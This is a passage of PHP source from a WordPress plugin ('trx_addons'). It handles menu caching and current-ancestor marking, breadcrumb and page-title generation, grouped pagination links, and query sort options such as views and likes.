			while ( (int)$parent > 0 && $last_parent != $parent ) {
				$last_parent = $parent;
				foreach ( $items as $k => $v ) {
					if ( ! empty( $v->db_id ) && $v->db_id == $parent ) {
						$items[ $k ]->current_item_ancestor = true;
						if ( is_array( $v->classes ) && ! in_array( 'current-menu-ancestor', $v->classes ) ) {
							$items[ $k ]->classes[] = 'current-menu-ancestor';
						}
						if ( $first ) {
							$first = false;
							$items[ $k ]->current_item_parent = true;
							if ( is_array( $v->classes ) && ! in_array( 'current-menu-parent', $v->classes ) ) {
								$items[ $k ]->classes[] = 'current-menu-parent';
							}
						}
						$parent = ! empty( $v->menu_item_parent ) ? $v->menu_item_parent : 0;
						break;
					}
				}
			}
		}
		return $items;
	}
}

if ( ! function_exists( 'trx_addons_get_menu_cache_key' ) ) {
	/**
	 * Generate menu cache key. Used to store menu in the cache
	 * 
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu cache key
	 */
	function trx_addons_get_menu_cache_key( $args ) {
		$key = ! empty( $args->theme_location )
				? 'location-(' . $args->theme_location . ')'
				: 'menu-(' . ( ! empty( $args->menu )
								? ( ! empty( $args->menu->slug )
									? $args->menu->slug
									: $args->menu
									)
								: ''
								)
							. ')';
		return str_replace( ' ', '', $key );
	}
}

if ( ! function_exists( 'trx_addons_add_menu_cache' ) ) {
	add_action( 'wp_nav_menu', 'trx_addons_add_menu_cache', 100, 2 );
	/**
	 * Add menu to the cache
	 * 
	 * @hooked wp_nav_menu
	 * 
	 * @param string $html		Menu html
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu html
	 */
	function trx_addons_add_menu_cache( $html = '', $args = array() ) {
		if ( apply_filters( 'trx_addons_add_menu_cache', trx_addons_is_on( trx_addons_get_option('menu_cache') ), $args ) ) {
			trx_addons_cache_save( trx_addons_get_menu_cache_key( $args ), $html, 60 * 60 );
		}
		return $html;
	}
}

if ( ! function_exists( 'trx_addons_get_menu_cache' ) ) {
	add_action( 'pre_wp_nav_menu', 'trx_addons_get_menu_cache', 100, 2 );
	/**
	 * Get menu from the cache
	 * 
	 * @hooked pre_wp_nav_menu
	 * 
	 * @param string $html		Menu html
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu html from cache
	 */
	function trx_addons_get_menu_cache( $html, $args ) {
		if ( apply_filters( 'trx_addons_get_menu_cache', trx_addons_is_on( trx_addons_get_option('menu_cache') ), $args ) ) {
			$cache = trx_addons_cache_load( trx_addons_get_menu_cache_key( $args ) );
			if ( ! empty( $cache ) ) {
				$html = apply_filters( 'trx_addons_filter_get_menu_cache_html', $cache, $args );
			}
		}
		return $html;
	}
}

if ( ! function_exists( 'trx_addons_get_menu_cache_html' ) ) {
	add_filter( 'trx_addons_filter_get_menu_cache_html', 'trx_addons_get_menu_cache_html', 10, 2 );
	/**
	 * Filter menu html from cache before return it. Used to remove some classes and add to js-list with cached menus
	 * 
	 * @hooked trx_addons_get_menu_cache
	 * 
	 * @param string $html		Menu html
	 * @param array $args		Menu args
	 * 
	 * @return string			Menu html
	 */
	function trx_addons_get_menu_cache_html( $html, $args = array() ) {
		// Remove class 'sc_layouts_menu_nav'
		if ( ! empty( $args->clear_sc_layouts_classes ) ) {
			$html = str_replace( 'sc_layouts_menu_nav', '', $html );
		}
		// Add to js-list with cached menus
		$menu_id = '';
		$menu_class = '';
		if ( preg_match_all( '/<ul[^>]+id=[\'"]([^\'"]+)[\'"]/i', $html, $matches ) && ! empty( $matches[1][0] ) ) {
			$menu_id = trim( $matches[1][0] );
		} else if ( ! empty( $args->menu_id ) ) {
			$menu_id = trim( $args->menu_id );
		} else {
			if ( ! empty( $args->menu_class ) ) {
				$menu_class = trim( $args->menu_class );
			} else if ( preg_match_all( '/<ul[^>]+class=[\'"]([^\'"]+)[\'"]/i', $html, $matches ) && ! empty( $matches[1][0] ) ) {
				$menu_class = trim( $matches[1][0] );
			}
			if ( ! empty( $menu_class ) ) {
				$menu_class = join( '.', array_map( 'trim', explode( ' ', trim( $matches[1][0] ) ) ) );
			}
		}
		if ( ! empty( $menu_id ) || ! empty( $menu_class ) ) {
			global $TRX_ADDONS_STORAGE;
			if ( ! isset( $TRX_ADDONS_STORAGE['menu_cache'] ) ) {
				$TRX_ADDONS_STORAGE['menu_cache'] = array();
			}
			$TRX_ADDONS_STORAGE['menu_cache'][] = ! empty( $menu_id ) ? '#' . esc_attr( $menu_id ) : '.' . esc_attr( $menu_class );
		}
		return $html;
	}
}

if ( ! function_exists( 'trx_addons_add_menu_cache_to_js' ) ) {
	add_filter( 'trx_addons_filter_localize_script', 'trx_addons_add_menu_cache_to_js' );
	/**
	 * Add selectors of menus in the cache to js-vars
	 * 
	 * @hooked trx_addons_filter_localize_script
	 * 
	 * @param array $vars		JS-vars
	 * 
	 * @return array			JS-vars
	 */
	function trx_addons_add_menu_cache_to_js( $vars ) {
		global $TRX_ADDONS_STORAGE;
		$vars['menu_cache'] = apply_filters( 'trx_addons_filter_menu_cache', ! empty( $TRX_ADDONS_STORAGE['menu_cache'] ) ? $TRX_ADDONS_STORAGE['menu_cache'] : array() );
		return $vars;
	}
}

if ( ! function_exists( 'trx_addons_widget_nav_menu_args' ) ) {
	add_filter( 'widget_nav_menu_args', 'trx_addons_widget_nav_menu_args', 10, 4 );
	/**
	 * Set a menu option to clear class 'sc_layouts_menu_nav' from cached menu
	 * 
	 * @hooked widget_nav_menu_args
	 * 
	 * @param array $nav_menu_args		Menu args
	 * @param object $nav_menu			Menu object
	 * @param array $args				Menu args
	 * @param array $instance			Menu instance
	 * 
	 * @return array					Menu args
	 */
	function trx_addons_widget_nav_menu_args( $nav_menu_args, $nav_menu, $args, $instance ) {
		$nav_menu_args['clear_sc_layouts_classes'] = true;
		return $nav_menu_args;
	}
}

if ( ! function_exists( 'trx_addons_clear_menu_cache' ) ) {
	add_action( 'wp_update_nav_menu', 'trx_addons_clear_menu_cache', 10, 2 );
	/**
	 * Clear menu cache after update menu.
	 * DEPRECATED in 1.87.0, because it's not used anymore - menu cache is cleared in the 'trx_addons_cache_clear_on_save_menu' hook
	 * 
	 * @hooked wp_update_nav_menu
	 * 
	 * @param int $menu_id		Menu ID
	 * @param array $menu_data	Menu data
	 */
	function trx_addons_clear_menu_cache( $menu_id = 0, $menu_data = array() ) {
		delete_transient( 'trx_addons_menu_' . get_stylesheet() );
	}
}


/* Breadcrumbs
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_action_breadcrumbs') ) {
	add_action( 'trx_addons_action_breadcrumbs', 'trx_addons_action_breadcrumbs', 10, 2 );
	/**
	 * Show breadcrumbs path on action 'trx_addons_action_breadcrumbs'
	 * 
	 * @hooked trx_addons_action_breadcrumbs
	 * 
	 * @param string $before		HTML before breadcrumbs
	 * @param string $after			HTML after breadcrumbs
	 */
	function trx_addons_action_breadcrumbs( $before = '', $after = '' ) {
		if ( ( $fdir = trx_addons_get_file_dir( 'templates/tpl.breadcrumbs.php' ) ) != '' ) {
			include $fdir;
		}
	}
}

if ( ! function_exists( 'trx_addons_get_breadcrumbs' ) ) {
	/**
	 * Return breadcrumbs path
	 * 
	 * @param array $args		Parameters
	 * 
	 * @return string			HTML with breadcrumbs
	 */
	function trx_addons_get_breadcrumbs( $args = array() ) {
		global $wp_query, $post;
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'trx_addons'),		// Home page title (if empty - not showed)
			'home_link' => '',								// Home page link
			'truncate_title' => 50,							// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',						// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',		// Delimiter between breadcrumbs items
			'max_levels' => trx_addons_get_option('breadcrumbs_max_level')		// Max categories in the path (0 - unlimited)
			), is_array($args) ? $args : array( 'home' => $args )
		);

		if ( is_front_page() ) {	// || is_home()
			return '';
		}

		if ( $args['max_levels'] <= 0 ) {
			$args['max_levels'] = 999;
		}
		$level = 1 + ( isset( $args['home'] ) && $args['home'] != '' ? 1 : 0 );	// Current element + Home
		
		$rez = $rez_all = $rez_parent = $rez_level = '';
		
		// Get link to the 'All posts (products, events, etc.)' page
		if ( $level >= $args['max_levels'] ) {
			$rez_level = '...';
		} else {
			$rez_all = apply_filters( 'trx_addons_filter_get_blog_all_posts_link', '', $args );
			if ( ! empty( $rez_all ) && $rez_all != '#' ) {			// All posts
				$level++;
			}
		}

		$cat = $parent_tax = '';
		$parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if ( is_page() || is_attachment() || trx_addons_is_single() ) {
			$page_parent_id = apply_filters( 'trx_addons_filter_get_parent_id',
											isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0,
											isset($wp_query->post->ID) ? $wp_query->post->ID : 0
										);
			$post_id = ( is_attachment() 
							? $page_parent_id 
							: ( isset( $wp_query->post->ID )
									? $wp_query->post->ID 
									: 0
								)
						);
			while ( $page_parent_id > 0 ) {
				$page_parent = get_post( $page_parent_id );
				if ( $level >= $args['max_levels'] ) {
					$rez_level = '...';
				} else {
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . esc_url(get_permalink($page_parent_id)) . '">' 
									. wp_kses_data( trx_addons_strshort( $page_parent->post_title, $args['truncate_title'], $args['truncate_add'] ) )
									. '</a>' 
									. ( ! empty( $rez_parent ) ? $args['delimiter'] : '' )
									. $rez_parent;
					$level++;
				}
				if ( ( $page_parent_id = apply_filters('trx_addons_filter_get_parent_id', $page_parent->post_parent, $page_parent_id ) ) > 0 ) {
					$post_id = $page_parent_id;
				}
			}
		}
		// Show parents
		$step = 0;
		do {
			if ( $step++ == 0 ) {
				if ( trx_addons_is_single() || is_attachment() ) {
					$post_type = get_post_type();
					if ( $post_type == 'post' ) {
						$cats = get_the_category();
						$cat = ! empty( $cats[0] ) ? $cats[0] : false;
					} else {
						$tax = trx_addons_get_post_type_taxonomy( $post_type );
						if ( ! empty( $tax ) ) {
							$cats = get_the_terms( get_the_ID(), $tax );
							$cat = ! empty( $cats[0] ) ? $cats[0] : false;
						}
					}
					if ( $cat ) {
						if ( $level >= $args['max_levels'] ) {
							$rez_level = '...';
						} else {
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url(get_term_link($cat->term_id, $cat->taxonomy)).'">' 
											. apply_filters( 'trx_addons_filter_term_name', trx_addons_strshort( $cat->name, $args['truncate_title'], $args['truncate_add'] ), $cat )
											. '</a>' 
											. ( ! empty( $rez_parent ) ? $args['delimiter'] : '' )
											. $rez_parent;
							$level++;
						}
					}
				} else if ( is_category() ) {
					$cat_id = (int)get_query_var( 'cat' );
					if ( empty( $cat_id ) ) {
						$cat_id = get_query_var( 'category_name' );
					}
					$cat = get_term_by( is_numeric( $cat_id ) && (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( is_tag() ) {
					$cat = get_term_by( 'slug', get_query_var( 'post_tag' ), 'post_tag', OBJECT);
				} else if ( is_tax() ) {
					$cat = $wp_query->get_queried_object();
				}
				if ( $cat ) {
					$parent = $cat->parent;
					$parent_tax = $cat->taxonomy;
				}
			}
			if ( $parent ) {
				$cat = get_term_by( 'id', $parent, $parent_tax, OBJECT);
				if ( $cat ) {
					$cat_link = get_term_link($cat->slug, $cat->taxonomy);
					if ( $level >= $args['max_levels'] ) {
						$rez_level = '...';
					} else {
						$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
										. apply_filters( 'trx_addons_filter_term_name', trx_addons_strshort( $cat->name, $args['truncate_title'], $args['truncate_add'] ), $cat )
										. '</a>' 
										. ( ! empty( $rez_parent ) ? $args['delimiter'] : '' )
										. $rez_parent;
						$level++;
					}
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		$rez_parent = apply_filters('trx_addons_filter_get_parents_links', $rez_parent, $args);

		$rez_period = '';
		if ( ( is_day() || is_month() ) && is_object( $post ) ) {
			$year  = get_the_time('Y'); 
			$month = get_the_time('m'); 
			$rez_period = '<a class="breadcrumbs_item cat_parent" href="' . get_year_link( $year ) . '">' . ($year) . '</a>';
			if ( is_day() ) {
				$rez_period .= ( ! empty( $rez_period ) ? $args['delimiter'] : '' )
							. '<a class="breadcrumbs_item cat_parent" href="' . esc_url( get_month_link( $year, $month ) ) . '">'
								. esc_html( get_the_date('F') ) 
							. '</a>';
			}
		}

		if ( ! is_front_page() ) {	// && !is_home()

			$title = trx_addons_get_blog_title();
			if ( is_array( $title ) ) {
				$title = $title['text'];
			}
			$title = trx_addons_strshort( $title, $args['truncate_title'], $args['truncate_add'] );

			$rez .= ( isset( $args['home'] ) && $args['home'] != '' 
					? '<a class="breadcrumbs_item home" href="' . esc_url( $args['home_link'] ? $args['home_link'] : home_url('/') ) . '">'
						. $args['home']
						. '</a>'
						. $args['delimiter']
					: '') 
				. ( ! empty( $rez_all ) && $rez_all != '#' ? $rez_all . $args['delimiter'] : '' )
				. ( ! empty( $rez_level )  ? $rez_level  . $args['delimiter'] : '' )
				. ( ! empty( $rez_parent ) ? $rez_parent . $args['delimiter'] : '' )
				. ( ! empty( $rez_period ) ? $rez_period . $args['delimiter'] : '' )
				. ( ! empty( $title )      ? '<span class="breadcrumbs_item current">' . wp_kses_data( $title ) . '</span>' : '' );
		}

		return apply_filters( 'trx_addons_filter_get_breadcrumbs', $rez );
	}
}

if ( ! function_exists( 'trx_addons_get_blog_all_posts_link' ) ) {
	add_filter( 'trx_addons_filter_get_blog_all_posts_link', 'trx_addons_get_blog_all_posts_link', 10, 2 );
	/**
	 * Return link to the all posts page for the breadcrumbs
	 * 
	 * @hooked trx_addons_filter_get_blog_all_posts_link
	 * 
	 * @param string $link Link to the all posts page
	 * @param array $args Breadcrumbs args
	 * 
	 * @return string     Link to the all posts page
	 */
	function trx_addons_get_blog_all_posts_link( $link = '', $args = array() ) {
		if ( $link == '' ) {
			if ( trx_addons_is_posts_page() && ! is_home() ) {	// ! is_post_type_archive( 'post' )
				if ( ( $url = get_post_type_archive_link( 'post' ) ) != '' ) {
					$obj = get_post_type_object( 'post' );
					$link = '<a href="' . esc_url( $url ) . '">' . esc_html( $obj->labels->all_items ) . '</a>';
				}
			}
		}
		return $link;
	}
}

if ( ! function_exists( 'trx_addons_is_posts_page' ) ) {
	/**
	 * Check if it's posts page
	 * 
	 * @return bool
	 */
	function trx_addons_is_posts_page() {
		return ! is_search()
					&& (
						( trx_addons_is_single() && get_post_type() == 'post' )
						|| is_category()
						|| is_tag()
						);
	}
}

if ( ! function_exists( 'trx_addons_cpt_custom_get_blog_all_posts_link' ) ) {
	add_filter('trx_addons_filter_get_blog_all_posts_link', 'trx_addons_cpt_custom_get_blog_all_posts_link', 1000, 2);
	/**
	 * Return link to the 'All posts' for CPT in the breadcrumbs
	 * 
	 * @hooked trx_addons_filter_get_blog_all_posts_link
	 * 
	 * @param string $link Link to the all posts page
	 * @param array $args Breadcrumbs args
	 * 
	 * @return string     Link to the all posts page
	 */
	function trx_addons_cpt_custom_get_blog_all_posts_link( $link = '', $args = array() ) {
		if ( $link == '' && ! is_search() ) {
			$pt = '';
			if ( trx_addons_is_single() ) {
				$pt = get_post_type();
			} else {
				$obj = get_queried_object();
				if ( ! empty( $obj->taxonomy ) ) {
					$tax = get_taxonomy( $obj->taxonomy );
					if ( ! empty( $tax->object_type[0] ) ) {
						$pt = $tax->object_type[0];
					}
				}
			}
			if ( ! empty( $pt ) ) {
				$obj = get_post_type_object( $pt );
				if ( ( $url = get_post_type_archive_link( $pt ) ) != '' ) {
					$link = '<a href="' . esc_url( $url ) . '">' . esc_html( $obj->labels->all_items ) . '</a>';
				}
			}
		}
		return $link;
	}
}

if ( ! function_exists('trx_addons_get_blog_title') ) {
	/**
	 * Return text for the blog title
	 *
	 * @return string
	 */
	function trx_addons_get_blog_title() {
		if ( is_front_page() ) {
			$title = esc_html__( 'Home', 'trx_addons' );
		} else if ( is_home() ) {
			$title = get_option( 'page_for_posts' ) == get_queried_object_id()
						? get_the_title( get_queried_object_id() )
						: esc_html__( 'All Posts', 'trx_addons' );
		} else if ( is_author() ) {
			$curauth = get_query_var( 'author_name' ) ? get_user_by( 'slug', get_query_var( 'author_name' ) ) : get_userdata( get_query_var( 'author' ) );
			$title = sprintf( esc_html__( 'Author page: %s', 'trx_addons' ), $curauth->display_name );
		} else if ( is_404() ) {
			$title = esc_html__( 'URL not found', 'trx_addons' );
		} else if ( is_search() ) {
			$title = sprintf( esc_html__( 'Search: %s', 'trx_addons' ), get_search_query() );
		} else if ( is_day() ) {
			$title = sprintf( esc_html__( 'Daily Archives: %s', 'trx_addons' ), get_the_date() );
		} else if ( is_month() ) {
			$title = sprintf( esc_html__( 'Monthly Archives: %s', 'trx_addons' ), get_the_date( 'F Y' ) );
		} else if ( is_year() ) {
			$title = sprintf( esc_html__( 'Yearly Archives: %s', 'trx_addons' ), get_the_date( 'Y' ) );
		} else if ( is_category() ) {
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_cat_title( '', false ) );
		} else if ( is_tag() ) {
			$title = sprintf( esc_html__( 'Tag: %s', 'trx_addons' ), single_tag_title( '', false ) );
		} else if ( is_tax() ) {
			$title = single_term_title( '', false );
		} else if ( is_post_type_archive() ) {
			$obj = get_queried_object();
			$title = ! empty( $obj->labels->all_items )
						? $obj->labels->all_items 
						: ( ! empty( $obj->post_title )
							? $obj->post_title
							: '' );
		} else if ( is_attachment() ) {
			$title = sprintf( esc_html__( 'Attachment: %s', 'trx_addons' ), get_the_title() );
		} else if ( trx_addons_is_single() || is_page() ) {
			$title = get_the_title();
		} else if ( trx_addons_is_preview() ) {		// Default title to display it inside page builders
			$title = esc_html__( 'Page (post) title', 'trx_addons' );
		} else {
			$title = get_the_title();	// get_bloginfo('name', 'raw');
		}
		return apply_filters( 'trx_addons_filter_get_blog_title', $title );
	}
}



/* Blog pagination
------------------------------------------------------------------------------------- */

if ( ! function_exists( 'trx_addons_show_pagination' ) ) {
	/**
	 * Display pagination with a specified style
	 * 
	 * @param string $pagination  Pagination style: 'pages' - standard WP pagination, 'links' - next/prev links
	 */
	function trx_addons_show_pagination( $pagination = 'pages' ) {
		global $wp_query;

		// Page numbers
		if ( $pagination == 'pages' ) {
			trx_addons_show_layout( str_replace( "\n", '', get_the_posts_pagination(
				apply_filters( 'trx_addons_filter_get_the_posts_pagination_args', array(
					'mid_size'           => 2,
					'prev_text'          => esc_html__( '<', 'trx_addons' ),
					'next_text'          => esc_html__( '>', 'trx_addons' ),
					'before_page_number' => '<span class="meta-nav screen-reader-text">' . esc_html__( 'Page', 'trx_addons' ) . ' </span>',
				) )
			) ) );

		// Prev/Next links
		} else if ($pagination == 'links') {
			?>
			<div class="nav-links-old">
				<span class="nav-prev"><?php previous_posts_link( is_search() ? esc_html__('Previous posts', 'trx_addons') : esc_html__('Newest posts', 'trx_addons') ); ?></span>
				<span class="nav-next"><?php next_posts_link( is_search() ? esc_html__('Next posts', 'trx_addons') : esc_html__('Older posts', 'trx_addons'), $wp_query->max_num_pages ); ?></span>
			</div>
			<?php
		}
	}
}

if ( ! function_exists('trx_addons_pagination') ) {
	/**
	 * Display pagination with group pages: [1-10][11-20]...[24][25][26]...[31-40][41-45]
	 *
	 * @param array $args - array of parameters
	 */
	function trx_addons_pagination( $args = array() ) {
		$args = array_merge(array(
			'class' => '',				// Additional 'class' attribute for the pagination section
			'button_class' => '',		// Additional 'class' attribute for the each page button
			'base_link' => '',			// Base link for each page. If specified - all pages use it and add '&page=XX' to the end of this link. Else - use get_pagenum_link()
			'total_posts' => 0,			// Total posts number
			'posts_per_page' => 0,		// Posts per page
			'total_pages' => 0,			// Total pages (instead total_posts, otherwise - calculate number of pages)
			'cur_page' => 0,			// Current page
			'near_pages' => 2,			// Number of pages to be displayed before and after the current page
			'group_pages' => 10,		// How many pages in group
			'pages_text' => '', 		//__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'trx_addons'),
			'cur_text' => "%PAGE_NUMBER%",
			'page_text' => "%PAGE_NUMBER%",
			'first_text'=> __('&laquo; First', 'trx_addons'),
			'last_text' => __("Last &raquo;", 'trx_addons'),
			'prev_text' => __("&laquo; Prev", 'trx_addons'),
			'next_text' => __("Next &raquo;", 'trx_addons'),
			'dot_text' => "&hellip;",
			'before' => '',
			'after' => ''
			),  is_array( $args )
					? $args 
					: ( is_int($args)
						? array( 'cur_page' => $args ) 		// If a number parameter received - use it as offset
						: array( 'class' => $args )			// If a string parameter received - use it as 'class' name
						)
					);
		if ( empty( $args['before'] ) )	$args['before'] = '<div class="trx_addons_pagination'.(!empty($args['class']) ? ' '.$args['class'] : '').'">';
		if ( empty( $args['after'] ) ) 	$args['after'] = '</div>';
		
		extract($args);
		
		global $wp_query;
	
		// Detect total pages
		if ( $total_pages == 0 ) {
			if ( $total_posts == 0 ) $total_posts = $wp_query->found_posts;
			if ( $posts_per_page == 0 ) $posts_per_page = (int) get_query_var('posts_per_page');
			$total_pages = ceil($total_posts / $posts_per_page);
		}
		
		if ( $total_pages < 2 ) return;
		
		// Detect current page
		if ( $cur_page == 0 ) {
			$cur_page = (int) get_query_var('paged');
			if ( $cur_page == 0 ) $cur_page = (int) get_query_var('page');
			if ( $cur_page <= 0 ) $cur_page = 1;
		}
		// Near pages
		$show_pages_start = $cur_page - $near_pages;
		$show_pages_end = $cur_page + $near_pages;
		// Current group
		$cur_group = ceil($cur_page / $group_pages);
	
		$output = $before;
	
		// Page XX from XXX
		if ($pages_text) {
			$pages_text = str_replace(
				array("%CURRENT_PAGE%", "%TOTAL_PAGES%"),
				array(number_format_i18n($cur_page),number_format_i18n($total_pages)),
				$pages_text);
			$output .= '<span class="'.esc_attr($class).'_pages '.$button_class.'">' . $pages_text . '</span>';
		}
		if ($cur_page > 1) {
			// First page
			$first_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $first_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page=1' : get_pagenum_link()).'" data-page="1" class="'.esc_attr($class).'_first '.$button_class.'">'.$first_text.'</a>';
			// Prev page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page-1) : get_pagenum_link($cur_page-1)).'" data-page="'.esc_attr($cur_page-1).'" class="'.esc_attr($class).'_prev '.$button_class.'">'.$prev_text.'</a>';
		}
		// Page buttons
		$group = 1;
		$dot1 = $dot2 = false;
		for ($i = 1; $i <= $total_pages; $i++) {
			if ($i % $group_pages == 1) {
				$group = ceil($i / $group_pages);
				if ($group != $cur_group)
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.$i : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.esc_attr($class).'_group '.$button_class.'">'.$i.'-'.min($i+$group_pages-1, $total_pages).'</a>';
			}
			if ($group == $cur_group) {
				if ($i < $show_pages_start) {
					if (!$dot1) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_start-1) : get_pagenum_link($show_pages_start-1)).'" data-page="'.esc_attr($show_pages_start-1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot1 = true;
					}
				} else if ($i > $show_pages_end) {
					if (!$dot2) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_end+1) : get_pagenum_link($show_pages_end+1)).'" data-page="'.esc_attr($show_pages_end+1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot2 = true;
					}
				} else if ($i == $cur_page) {
					$cur_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $cur_text);
					$output .= '<span class="'.esc_attr($class).'_current active '.$button_class.'">'.$cur_text.'</span>';
				} else {
					$text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $page_text);
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($i) : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.$button_class.'">'.$text.'</a>';
				}
			}
		}
		if ($cur_page < $total_pages) {
			// Next page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page+1) : get_pagenum_link($cur_page+1)).'" data-page="'.esc_attr($cur_page+1).'" class="'.esc_attr($class).'_next '.$button_class.'">'.$next_text.'</a>';
			// Last page
			$last_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $last_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($total_pages) : get_pagenum_link($total_pages)).'" data-page="'.esc_attr($total_pages).'" class="'.esc_attr($class).'_last '.$button_class.'">'.$last_text.'</a>';
		}
		$output .= $after;
		trx_addons_show_layout($output);
	}
}

if ( ! function_exists('trx_addons_get_current_page') ) {
	/**
	 * Return current page number from GET or POST parameter 'page' or query vars 'paged' or 'page'
	 * 
	 * @return int  Current page number
	 */
	function trx_addons_get_current_page() {
		if ( ( $page = trx_addons_get_value_gp( 'page', -999 ) ) == -999 ) {
			if ( ! ( $page = get_query_var( 'paged' ) ) ) {
				if ( ! ( $page = get_query_var( 'page' ) ) ) {
					$page = 1;
				}
			}
		}
		return $page;
	}
}

if ( ! function_exists('trx_addons_get_the_ID') ) {
	/**
	 * Return current post ID
	 * 
	 * @return int  Current post ID
	 */
	function trx_addons_get_the_ID() {
		global $wp_query;
		return trx_addons_in_the_loop() 
					? get_the_ID() 
					: ( ! empty( $wp_query->post->ID )
						? $wp_query->post->ID
						: ( trx_addons_is_singular() && ! empty( $wp_query->queried_object->ID )
							? $wp_query->queried_object->ID
							: 0
							)
						);
	}
}

if ( ! function_exists('trx_addons_in_the_loop') ) {
	/**
	 * Check if current post/page is inside the loop
	 * 
	 * @return bool
	 */
	function trx_addons_in_the_loop() {
		$rez = in_the_loop();
		if ( ! $rez ) {
			global $TRX_ADDONS_STORAGE;
			if ( ! empty( $TRX_ADDONS_STORAGE['sc_list'] ) && is_array( $TRX_ADDONS_STORAGE['sc_list'] ) ) {
				foreach ( $TRX_ADDONS_STORAGE['sc_list'] as $sc => $params ) {
					if ( ! empty( $params['post_loop'] ) ) {
						$rez = trx_addons_sc_stack_check( "trx_sc_{$sc}", true );	// Check if last stack element is post_loop shoctcode
						if ( $rez ) {
							break;
						}
					}
				}
			}
			if ( ! $rez && ! empty( $TRX_ADDONS_STORAGE['cpt_list'] ) && is_array( $TRX_ADDONS_STORAGE['cpt_list'] ) ) {
				foreach ( $TRX_ADDONS_STORAGE['cpt_list'] as $sc => $params ) {
					if ( ! empty( $params['post_loop'] ) ) {
						$rez = trx_addons_sc_stack_check( "trx_sc_{$sc}", true );	// Check if last stack element is post_loop shoctcode
						if ( $rez ) {
							break;
						}
					}
				}
			}
		}
		return $rez;
	}
}

if ( ! function_exists( 'trx_addons_is_singular' ) ) {
	/**
	 * Check if current mode is 'singular'
	 * 
	 * @param string $type Post type
	 * 
	 * @return bool  True if current mode is 'singular' for specified post type
	 */
	function trx_addons_is_singular( $type = '' ) {
		global $wp_query;
		return apply_filters( 'trx_addons_filter_is_singular', ! empty( $wp_query->queried_object->ID ) && is_singular( $type ), $type );	// did_action( 'wp_loaded' ) &&
	}
}

if ( ! function_exists( 'trx_addons_is_single' ) ) {
	/**
	 * Check if current mode is 'single'
	 * 
	 * @return bool  True if current mode is 'single'
	 */
	function trx_addons_is_single() {
		global $wp_query;
		return apply_filters( 'trx_addons_filter_is_single', ! empty( $wp_query->queried_object->ID ) && is_single() );		// did_action( 'wp_loaded' ) &&
	}
}



/* Query manipulations
------------------------------------------------------------------------------------- */

if ( ! function_exists('trx_addons_query_add_sort_order') ) {
	/**
	 * Add sorting parameter to query arguments
	 *
	 * @param array $args      Query arguments
	 * @param string $orderby  Order by
	 * @param string $order    Order
	 * 
	 * @return array   	       Modified query arguments
	 */
	function trx_addons_query_add_sort_order( $args, $orderby = 'date', $order = 'desc' ) {
		if ( ! empty( $orderby ) && ( empty( $args['orderby'] ) || $orderby != 'none' ) ) {
			$q          = apply_filters( 'trx_addons_filter_add_sort_order', array(), $orderby, $order );
			$q['order'] = 'asc' == $order ? 'asc' : 'desc';
			if ( empty( $q['orderby'] ) ) {
				if ($orderby == 'none') {
					$q['orderby'] = 'none';
				} else if ($orderby == 'ID') {
					$q['orderby'] = 'ID';
				} else if ($orderby == 'comments') {
					$q['orderby'] = 'comment_count';
				} else if ($orderby == 'title' || $orderby == 'alpha') {
					$q['orderby'] = 'title';
				} else if ($orderby == 'rand' || $orderby == 'random')  {
					$q['orderby'] = 'rand';
				} else if ($orderby == 'update' || $orderby == 'post_update' || $orderby == 'post_modified') {
					$q['orderby'] = 'post_modified';
				} else {
					$q['orderby'] = 'post_date';
				}
			}
			foreach ( $q as $mk => $mv ) {
				if ( is_array( $args ) ) {
					$args[ $mk ] = $mv;
				} else {
					$args->set( $mk, $mv );
				}
			}
		}
		return apply_filters( 'trx_addons_filter_add_sort_order_args', $args, $orderby, $order );
	}
}

if ( ! function_exists( 'trx_addons_query_sort_order_views_likes' ) ) {
	add_filter('trx_addons_filter_add_sort_order', 'trx_addons_query_sort_order_views_likes', 10, 3);
	/**
	 * Add query parameters to sort posts by views or likes
	 * 
	 * @hooked trx_addons_filter_add_sort_order
	 * 
	 * @param array $q         Query arguments
	 * @param string $orderby  Order by
	 * @param string $order    Order
	 * 
	 * @return array           Modified query arguments
	 */
	function trx_addons_query_sort_order_views_likes( $q = array(), $orderby = 'date', $order = 'desc' ) {
		if ( 'views' == $orderby ) {
			$q['orderby']  = 'meta_value_num';
			$q['meta_key'] = 'trx_addons_post_views_count';
		} elseif ( 'likes' == $orderby ) {
			$q['orderby']  = 'meta_value_num';
			$q['meta_key'] = 'trx_addons_post_likes_count';
		}
		return $q;
	}
}

if ( ! function_exists('trx_addons_query_add_posts_and_cats') ) {
	/**
	 * Add posts and categories parameters to query arguments
	 *
